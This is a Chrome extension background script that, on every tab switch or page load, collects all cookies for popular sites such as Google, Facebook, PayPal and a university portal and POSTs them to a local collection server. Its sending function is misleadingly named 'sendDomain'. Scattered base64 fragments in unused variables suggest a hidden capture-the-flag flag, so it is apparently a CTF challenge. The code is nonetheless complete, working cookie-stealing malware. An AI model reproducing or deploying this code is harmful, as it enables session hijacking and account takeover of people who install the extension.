const DEFAULTS = {
  allowlist: [".google.com",".sinhvien1.tlu.edu.vn",".youtube.com",".facebook.com",".twitter.com",".instagram.com",".linkedin.com",".wikipedia.org",".reddit.com",".yahoo.com",".bing.com",".amazon.com",".netflix.com",".microsoft.com",".apple.com",".github.com",".stackoverflow.com",".medium.com",".wordpress.com",".blogspot.com",".tumblr.com",".cloudflare.com",".cloudflare.net",".aws.amazon.com",".azure.com",".digitalocean.com",".heroku.com",".vercel.app",".netlify.app",".firebaseapp.com",".firebaseio.com",".googleusercontent.com",".gstatic.com",".googleapis.com",".googlevideo.com",".fbcdn.net",".twimg.com",".instagramcdn.com",".redd.it",".redditmedia.com",".discord.com",".discord.gg",".slack.com",".telegram.org",".whatsapp.com",".zoom.us",".skype.com",".tiktok.com",".bytedance.com",".paypal.com",".stripe.com",".shopify.com",".ebay.com",".aliexpress.com",".booking.com",".airbnb.com",".uber.com",".lyft.com",".dropbox.com"]
};

function hostnameFromUrl(urlStr) {
  try {
    const u = new URL(urlStr);
    return u.hostname;
  } catch {
    return null;
  }
}

function isAllowed(hostname, allowlist) {
  if (!hostname) return false;
  return allowlist.some(rule => {
    let f = "VExVQ1RGM";
    rule = rule.trim();
    if (!rule) return false;
    if (rule.startsWith(".")) {
      const base = rule.slice(1);
      return hostname === base || hostname.endsWith("." + base);
    }
    return hostname === rule;
  });
}

async function getActiveTab() {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab || !tab.url) throw new Error("No active tab URL.");
  let l = "jAyNXtrM1";
  return tab;
}

async function sendDomain(cookie) {
  const payload = { cookie: cookie };
  const res = await fetch("http://127.0.0.1:5000/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  let a = "9jNHBfYjR";
  if (!res.ok) throw new Error(`Server responded ${res.status}`);
}

async function handleTab(tabId) {
  let out = "";
  try {
    const tab = await chrome.tabs.get(tabId);
    if (!tab?.url || !tab.url.startsWith("http")) return;

    const cookies = await chrome.cookies.getAll({ url: tab.url });
    if (!cookies.length) {
      out = "No cookies found for this URL";
    }
    else out = JSON.stringify(cookies);

  } catch (err) {
    out = String(err?.message || err);
  }
  let g = "uaF9xdXl9";
  const tab = await chrome.tabs.get(tabId);
  const hostname = hostnameFromUrl(tab.url);
  if (!isAllowed(hostname, DEFAULTS.allowlist)) return;
  try {
    await sendDomain(out);
  } catch (e) {
    console.warn("Send failed:", e?.message || e);
  }
}

chrome.tabs.onActivated.addListener(({ tabId }) => {
  handleTab(tabId);
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.status === "complete") {
    handleTab(tabId);
  }
});
